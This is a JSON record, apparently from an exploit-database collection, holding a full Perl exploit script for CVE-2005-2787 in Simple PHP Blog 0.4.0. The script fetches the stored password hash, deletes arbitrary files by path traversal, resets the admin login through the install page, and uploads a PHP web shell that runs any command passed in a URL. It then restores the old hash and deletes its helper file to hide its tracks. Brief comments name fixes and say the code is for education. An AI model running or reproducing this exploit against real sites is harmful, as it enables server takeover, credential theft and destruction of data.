{
  "id": "1191",
  "title": "Simple PHP Blog 0.4.0 - Multiple Remote s",
  "cve": "CVE-2005-2787",
  "vuln_type": "file_upload",
  "code": "#!/usr/bin/perl -w\r\n#===============================================================================\r\n#\tTitle:\t\tsphpblog_vulns.pl\r\n#\r\n#\tWritten by: \tKenneth F. Belva, CISSP\r\n#\t\t\tFranklin Technologies Unlimited, Inc.\r\n#\t\t\thttp://www.ftusecurity.com\r\n#\r\n#\tDate: \t\tAugust 25, 2005\r\n#\r\n#\tVersion:\t0.1\r\n#\r\n#\tDescription:\tThis program is for educational purposes only!\r\n#\t\t\tSimplePHPBlog as a few vulnerability which this\r\n#\t\t\tperl script demonstrates via an exploit.\r\n#\r\n#\tInstructions:\tShould be self-explanatory via the .pl help menu\r\n#\r\n#\tSolutions:\t\r\n#\t\t\t*** Solution 1\r\n#\t\t\tChange the line in comment_delete_cgi.php from\r\n#\t\t\t$logged_in = logged_in( false, true );    to\r\n#\t\t\t$logged_in = logged_in( true, true );\r\n#\r\n#\t\t\t*** Solution 2\r\n#\t\t\tPlace an .htaccess file with the following config in\r\n#\t\t\tthe ./config directory:\r\n#\r\n#\r\n#\t\t\t#---------------------\r\n#\t\t\t#Snip .htaccess start\r\n#\t\t\t#---------------------\t\t\t\r\n#\t\t\tIndexIgnore *\r\n#\r\n#\t\t\t<Files .htaccess>\r\n#\t\t\torder allow,deny\r\n#\t\t\tdeny from all\r\n#\t\t\t</Files>\r\n#\t\t\t\r\n#\t\t\t<Files *.txt>\r\n#\t\t\torder allow,deny\r\n#\t\t\tdeny from all\r\n#\t\t\t</Files>\r\n#\t\t\t#---------------------\r\n#\t\t\t#Snip .htaccess end\r\n#\t\t\t#---------------------\r\n#\r\n#\r\n#\t\t\t*** Solution 3\r\n#\t\t\tSee http://archives.neohapsis.com/archives/fulldisclosure/2005-08/0885.html\r\n#\t\t\t\tfor PHP modification to upload image script.\r\n#===============================================================================\r\n\r\n\r\n\r\n#-------------------------------------------------------------------------------\r\n#\tGlobal Paramaters\r\n#-------------------------------------------------------------------------------\r\nuse strict;\r\nuse warnings;\r\n\r\nuse vars qw/ %args /;\r\n\r\nuse Getopt::Std;\r\nrequire LWP::UserAgent;\r\nmy $ua = LWP::UserAgent->new;\r\n\r\n#-------------------------------------------------------------------------------\r\n#\tGlobal Routines\r\n#-------------------------------------------------------------------------------\r\n\r\n#Determine Operating System\r\nmy $OperatingSystem = $^O;\r\nmy $unix = \"\";\r\n\r\n#Set OS Parameter\r\nif (index(lc($OperatingSystem),\"win\")!=-1){\r\n\t\t   $unix=\"0\"; #windows system\r\n\t    }else{\r\n\t\t    $unix=\"1\"; #unix system\r\n\t    }\r\n\r\n#-------------------------------------------------------------------------------\r\n#\tThe Main Menu\r\n#-------------------------------------------------------------------------------\r\n\r\nsub menu()\r\n    {\r\n\t    if ($unix){system(\"clear\");}\r\n\t    \telse{system(\"cls\");}\r\n\r\n\t    print \"\r\n________________________________________________________________________________\r\n\t\t  SimplePHPBlog v0.4.0 Exploits\r\n\t\t\t     by\r\n\t\t     Kenneth F. Belva, CISSP\r\n\t\t   http://www.ftusecurity.com\r\n________________________________________________________________________________\r\n\r\n\tProgram\t: $0\r\n\tVersion\t: v0.1\r\n\tDate\t: 8/25/2005\r\n\tDescript: This perl script demonstrates a few flaws in\r\n\t\t  SimplePHPBlog.\r\n\t\r\n\tComments: THIS PoC IS FOR EDUCATIONAL PURPOSES ONLY...\r\n\t\t  DO NOT RUN THIS AGAINST SYSTEMS TO WHICH YOU DO \r\n\t\t  NOT HAVE PERMISSION TO DO SO!\r\n\t\t  \r\n\t\t  Please see this script comments for solution/fixes \r\n\t\t  to demonstrated vulnerabilities. \r\n\t\t  http://www.simplephpblog.com\r\n\r\n\tUsage\t: $0 [-h host] [-e exploit]\r\n\t\r\n\t\t-?      : this menu\r\n\t\t-h      : host\r\n\t\t-e\t: exploit\r\n\t\t\t(1)\t: Upload cmd.php in [site]/images/\r\n\t\t\t(2)\t: Retreive Password file (hash)\r\n\t\t\t(3)\t: Set New User Name and Password\r\n\t\t\t\t[NOTE - uppercase switches for exploits]\r\n\t\t\t\t-U\t: user name\r\n\t\t\t\t-P\t: password\r\n\t\t\t(4)\t: Delete a System File\r\n\t\t\t\t-F\t: Path and System File \r\n\r\n\tExamples: $0 -h 127.0.0.1 -e 2\r\n\t\t  $0 -h 127.0.0.1 -e 3 -U l33t -P l33t\r\n\t\t  $0 -h 127.0.0.1 -e 4 -F ./index.php\r\n\t\t  $0 -h 127.0.0.1 -e 4 -F ../../../etc/passwd\r\n\t\t  $0 -h 127.0.0.1 -e 1\r\n\t\";\t\r\n        \r\n\texit;\r\n    }\r\n\r\n\r\n#-------------------------------------------------------------------------------\r\n#\tInitial Routine\r\n#-------------------------------------------------------------------------------\r\n\r\n    sub init()\r\n    {\r\n\r\n\tuse Switch;\r\n\t\r\n\t# colon ':' after letter says that option takes variable\r\n        my $opt_string = 'e:U:P:h:F:?';\r\n        getopts( \"$opt_string\", \\%args ) or menu();\r\n\t\r\n\t#Load parameters\r\n\tmy $exploit = $args{e};\r\n\tmy $host = $args{h};\r\n\tmy $user = $args{U};\r\n\tmy $pass = $args{P};\r\n\tmy $file = $args{F};\r\n\t\r\n\t# What shall we do today?\r\n\tswitch (%args) {\r\n\t\tcase \"?\"\t{ menu();}\r\n\t\tcase \"e\"\t{\r\n\t\t\t\tswitch ($exploit) {\r\n\t\t\t\t\t\r\n\t\t\t\t\tif ($unix){system(\"clear\");}\r\n\t\t\t\t\telse{system(\"cls\");}\r\n\t\t\t\t\t\r\n\t\t\t\t\tprint \"\r\n________________________________________________________________________________\r\n\t\t  SimplePHPBlog v0.4.0 Exploits\r\n\t\t\t     by\r\n\t\t     Kenneth F. Belva, CISSP\r\n\t\t    http://www.ftusecurity.com\r\n________________________________________________________________________________\";\r\n\r\n\r\n\t\t\t\t\t# Upload cmd.php to /images\r\n\t\t\t\t\tcase \"1\" {\tprint \"\\nRunning cmd.php Upload Exploit....\\n\\n\";\r\n\t\t\t\t\t\t\t&UploadCmdPHP($host);}\r\n\t\t\t\t\t# Retrieve Username & Password hash\r\n\t\t\t\t\tcase \"2\" {\tprint \"\\nRunning Username and Password Hash Retrieval Exploit....\\n\\n\";\r\n\t\t\t\t\t\t\t&RetrievePwd($host.\"/config/password.txt\");}\r\n\t\t\t\t\t# Replace Username and Password\r\n\t\t\t\t\tcase \"3\" {\tprint \"\\nRunning Set New Username and Password Exploit....\\n\\n\";\r\n\t\t\t\t\t\t\t&SetUserPwd($host,$user,$pass);}\r\n\t\t\t\t\t# Delete a System File\r\n\t\t\t\t\tcase \"4\" {\tprint \"\\nRunning Delete System File Exploit....\\n\\n\";\r\n\t\t\t\t\t\t\t&DeleteFile($host . \"/comment_delete_cgi.php?y=05&m=08&comment=\",$file);}\r\n\r\n\t\t\t\t\t} #end $exploit switch\r\n\t\t\t\t\tprint \"\\n\\n\\n*** Exploit Completed....\\nHave a nice day! :)\\n\";\r\n\t\t\t\t} #end \"e\" case\r\n\t\telse\t\t{ menu();}\r\n\t\t} #end %args switch\r\n\r\n    } #end sub init\r\n\r\n#-------------------------------------------------------------------------------\r\n#\tExploit #1: Upload File Via POST \r\n#-------------------------------------------------------------------------------\r\n\r\nsub UploadCmdPHP {\r\n\r\n\t\r\n\tmy($url) = @_;\r\n\t\r\n\tuse LWP;\r\n\tuse HTTP::Request::Common qw(POST);\r\n\tmy $ua = LWP::UserAgent->new;\r\n\t\r\n\t$HTTP::Request::Common::DYNAMIC_FILE_UPLOAD++;\r\n\r\n\t#Step 1: Retrieve hash\r\n\t#-----------------------------------------------------------------------\r\n\tmy $hash = &RetrievePwd($url.\"/config/password.txt\");\r\n\t\r\n\r\n\t#Step 2: Delete Existing Password file (SetUserPwd)\r\n\t#Step 3: Create a temporary user id and password (SetUserPwd)\r\n\t#-----------------------------------------------------------------------\r\n\t&SetUserPwd($url,\"a\",\"a\");\r\n\t\r\n\r\n\t#Step 4: Log into the app and get the PHPSession / my_id session variable\r\n\t#-----------------------------------------------------------------------\r\n\tmy $SETcookie = &strip_session(&Login($url . \"/login_cgi.php\",\"a\",\"a\"));\r\n\t\r\n\t\r\n\t#Step 5: Create and upload our scripts (cmd.php & reset.php)\r\n\t#-----------------------------------------------------------------------\r\n\t\t&CreateTempPHPs();\r\n\t\r\n\t# Upload cmd.php\r\n\tmy $path = \"./cmd.php\";\r\n\tmy $file = \"cmd.php\";\r\n\tmy $req = POST($url.\"/upload_img_cgi.php\",\r\n\t\tCookie => 'PHPSESSID='.$SETcookie.'; my_id='.$SETcookie,\r\n\t\tContent_Type => 'form-data',\r\n\t\tContent => [userfile => [$path,$file],],\r\n\t\t);\r\n\t\r\n\tmy $response = $ua->request($req);\r\n\tprint \"\\nCreated cmd.php on target host: \" . $url;\r\n\t#$response->is_success or die \"Failed to POST '$url': \", $response->status_line;\r\n\t#return $response->as_string;\r\n\t\r\n\t# Upload reset.php\r\n\t$path = \"./reset.php\";\r\n\t$file = \"reset.php\";\r\n\t\t\r\n\t$req = POST($url.\"/upload_img_cgi.php\",\r\n\t\tCookie => 'PHPSESSID='.$SETcookie.'; my_id='.$SETcookie,\r\n\t\tContent_Type => 'form-data',\r\n\t\tContent => [userfile => [$path,$file],],\r\n\t\t);\r\n\t\r\n\t$response = $ua->request($req);\r\n\tprint \"\\nCreated reset.php on target host: \" . $url;\r\n\t#$response->is_success or die \"Failed to POST '$url': \", $response->status_line;\r\n\t#return $response->as_string;\r\n\t\r\n\t\t#Remove local PHP files\r\n\t\t&RemoveTempPHPs();\r\n\r\n\t\t\r\n\t#Step 6: Reset origional Passwpord\r\n\t#-----------------------------------------------------------------------\r\n\t&ResetHash($url.\"/images/reset.php\",$hash);\r\n\r\n\t\r\n\t#Step 7: Pass command to delete reset.php (clean up)\r\n\t#-----------------------------------------------------------------------\r\n\t&DeleteFile($url . \"/comment_delete_cgi.php?y=05&m=08&comment=\",\"./images/reset.php\");\r\n\tprint \"\\nRemoved reset.php from target host: \" . $url;\r\n\r\n\tprint \"\\n\\nTo run command please go to following link: \\n\\t\" . $url.\"/images/cmd.php?cmd=[your command]\";\r\n}\r\n\r\n#-------------------------------------------------------------------------------\r\n#\tExploit #2: Retrieve Password File \r\n#-------------------------------------------------------------------------------\r\n\r\nsub RetrievePwd {\r\n\t\r\n\tmy($url) = @_;\r\n\t\r\n\tuse LWP;\r\n\tuse HTTP::Request::Common;\r\n\tmy $ua = LWP::UserAgent->new;\r\n\r\n\tmy $req = GET($url);\r\n\t\r\n\tmy $response = $ua->request($req);\r\n\r\n\t$response->is_success or die \"Failed to POST '$url': \", $response->status_line;\r\n\t\r\n\tmy $hash = $response->content;\r\n\tprint \"\\nRetrieved Username and Password Hash: \" . $hash; \r\n\treturn $hash\r\n\r\n}\r\n\r\n\r\n#-------------------------------------------------------------------------------\r\n#\tExploit #3: Set New Username and Password \r\n#-------------------------------------------------------------------------------\r\n\r\nsub SetUserPwd{\r\n\r\n\tmy($url,$user,$pass) = @_;\r\n\r\n\t&DeleteFile($url . \"/comment_delete_cgi.php?y=05&m=08&comment=\", \"./config/password.txt\");\r\n\t&ResetPwd($url . \"/install03_cgi.php?blog_language=english\",$user,$pass);\r\n}\r\n\r\n\r\n#-------------------------------------------------------------------------------\r\n#\tPOST to Reset Username and Password (must delete password file first)\r\n#-------------------------------------------------------------------------------\r\n\r\nsub ResetPwd {\r\n\t\r\n\tmy($url,$user,$pass) = @_;\r\n\t\r\n\tuse LWP;\r\n\tuse HTTP::Request::Common;\r\n\tmy $ua = LWP::UserAgent->new;\r\n\r\n\tmy $req = POST($url,\r\n\t\t      [ user  => $user,\r\n\t\t\tpass => $pass,\r\n\t\t\tsubmit => '%C2%A0Submit%C2%A0'\r\n\t\t\t]\r\n\t\t);\r\n\t\r\n\tmy $response = $ua->request($req);\r\n\r\n\t$response->is_success or die \"Failed to POST '$url': \", $response->status_line;\r\n\r\n\tprint \"\\n./config/password.txt created!\";\r\n\tprint \"\\nUsername is set to: \".$user;\r\n\tprint \"\\nPassword is set to: \".$pass;\r\n\t\r\n}\r\n\r\n\r\n#-------------------------------------------------------------------------------\r\n#\tExploit #4: Delete Password File \r\n#-------------------------------------------------------------------------------\r\n\r\nsub DeleteFile {\r\n\t\r\n\tmy($url,$file) = @_;\r\n\t\r\n\tuse LWP;\r\n\tuse HTTP::Request::Common;\r\n\tmy $ua = LWP::UserAgent->new;\r\n\r\n\tmy $req = GET($url.$file);\r\n\t\r\n\tmy $response = $ua->request($req);\r\n\r\n\t$response->is_success or die \"Failed to POST '$url': \", $response->status_line;\r\n\tprint \"\\nDeleted File: \".$file; \r\n\t\r\n}\r\n\r\n\r\n#-------------------------------------------------------------------------------\r\n#\tlog into site\r\n#-------------------------------------------------------------------------------\r\n\r\nsub Login {\r\n\r\n\tmy($url,$user,$pass) = @_;\r\n\t\r\n\tuse LWP;\r\n\tuse HTTP::Request::Common;\r\n\tmy $ua = LWP::UserAgent->new;\r\n\r\n\tmy $req = POST($url,\r\n\t\t      [ user  => $user,\r\n\t\t\tpass => $pass,\r\n\t\t\tsubmit => '%C2%A0Submit%C2%A0'\r\n\t\t\t]\r\n\t\t);\r\n\t\r\n\tmy $response = $ua->request($req);\r\n\r\n\t$response->is_success or die \"Failed to POST '$url': \", $response->status_line;\r\n\r\n\tprint \"\\nLogged into SimplePHPBlog at: \".$url;\r\n\tprint \"\\nCurrent Username '\".$user.\"' and Password '\".$pass.\"'...\";\r\n\t\r\n\treturn $response->header('Set-Cookie');\r\n\t\r\n}\r\n\r\n\r\n#-------------------------------------------------------------------------------\r\n#\tPOST the hash\r\n#-------------------------------------------------------------------------------\r\n\r\nsub ResetHash {\r\n\r\n\tmy($url,$hash) = @_;\r\n\t\r\n\tuse LWP;\r\n\tuse HTTP::Request::Common;\r\n\tmy $ua = LWP::UserAgent->new;\r\n\r\n\tmy $req = POST($url,\r\n\t\t      [ hash  => $hash]\r\n\t\t);\r\n\t\r\n\tmy $response = $ua->request($req);\r\n\r\n\t$response->is_success or die \"Failed to POST '$url': \", $response->status_line;\r\n\r\n\tprint \"\\nReset Hash at: \".$url;\r\n\tprint \"\\nReset Hash value: \".$hash;\r\n\t\r\n\t\r\n}\r\n\r\n\r\n#------------------------------------------------------\r\n# Create Temp PHP files\r\n#------------------------------------------------------\r\n\r\nsub CreateTempPHPs{\r\n\r\n\tmy($hash) = @_;\r\n\r\n\topen(PHPFILE, \">./cmd.php\");\r\n\tprint PHPFILE &CreateCmdPHP();\r\n\tclose PHPFILE;\r\n\tprint \"\\nCreated cmd.php on your local machine.\";\r\n\t\r\n\topen(PHPFILE, \">./reset.php\");\r\n\tprint PHPFILE &CreateResetPHP();\r\n\tclose PHPFILE;\r\n\tprint \"\\nCreated reset.php on your local machine.\";\t\r\n}\r\n\r\n#------------------------------------------------------\r\n# Remove Temp PHP files\r\n#------------------------------------------------------\r\n\r\nsub RemoveTempPHPs{\r\n\r\n\tunlink(\"./cmd.php\");\r\n\tprint \"\\nRemoved cmd.php from your local machine.\";\r\n\tunlink(\"./reset.php\");\r\n\tprint \"\\nRemoved reset.php from your local machine.\";\r\n\t\r\n}\r\n\r\n\r\n#------------------------------------------------------\r\n# strip_session - Get PHP Session Variable\r\n#------------------------------------------------------\r\n\r\nsub strip_session {\r\n\t\r\n\tmy($savedata) = @_;\r\n\r\n\tmy $PHPstring = \"PHPSESSID\";\r\n\tmy $semi = \"\\;\";\r\n\t\r\n\tmy $datalength = length($savedata);\r\n\tmy $PHPstart= (index $savedata, $PHPstring)+10;\r\n\tmy $PHPend = index $savedata,$semi,$PHPstart;\r\n\tmy $PHPsession= substr $savedata, $PHPstart, ($PHPend-$PHPstart);\r\n\treturn $PHPsession;\r\n\t\r\n}\r\n\r\n\r\nsub CreateCmdPHP(){\r\n\t\r\n\treturn \"\r\n\r\n<?php\r\n\r\n\\$cmd = \\$_GET[\\'cmd\\'];\r\necho \\'<hr/><pre>\\';\r\necho \\'Command: \\' . \\$cmd;\r\necho '</pre><hr/><br>';\r\n\r\necho '<pre>';\r\n\\$last_line = system(\\$cmd,\\$output);\r\necho \\'</pre><hr/>\\';\r\n?>.\r\n\"; # end \r\n\t\r\n}\r\n\r\n\r\nsub CreateResetPHP(){\r\n\t\r\n\treturn \"\r\n\r\n<?php\r\n\r\n\\$hash = \\$_POST[\\'hash\\'];\r\n\\$fp = fopen(\\\"../config/password.txt\\\",\\\"w\\\");\r\nfwrite(\\$fp,\\$hash);\r\nfpclose(\\$fp);\r\n\r\n?>\r\n\"; #end return\r\n\r\n}\r\n\r\n\r\n#------------------------------------------------------\r\n# \tBegin Routines\r\n#------------------------------------------------------\r\n\tinit();\r\n\r\n# milw0rm.com [2005-09-01]",
  "url": "https://www.exploit-db.com/exploits/1191"
}